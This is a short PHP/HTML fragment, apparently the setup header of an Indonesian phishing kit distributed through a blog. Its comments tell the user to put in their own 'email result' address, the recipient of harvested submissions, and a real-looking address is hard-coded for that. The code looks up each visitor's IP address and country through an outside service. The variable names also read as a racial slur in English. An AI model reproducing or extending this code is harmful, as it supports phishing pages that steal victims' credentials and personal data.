<!-- https://ra-biitch.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--GANTI EMAIL RESULT DI BAWAH INI DENGAN EMAIL KAMU -->

<?php
$emailresult = "ilhamxshop@yahoo.com"; //Isi Dengan Email Result Kamu//

$alamat          = $_SERVER['REMOTE_ADDR'];
$inpoh     = json_decode(file_get_contents("http://ip.pycox.com/json/".$alamat.""));
$negro      = $inpoh->country_code;
$nama_negro = $inpoh->country_name;
$kode_negro = strtolower($negro);
?>

<!--SCRIPT ORI BY: RIYAN ANDHIKA https://facebook.com/mctb.store -->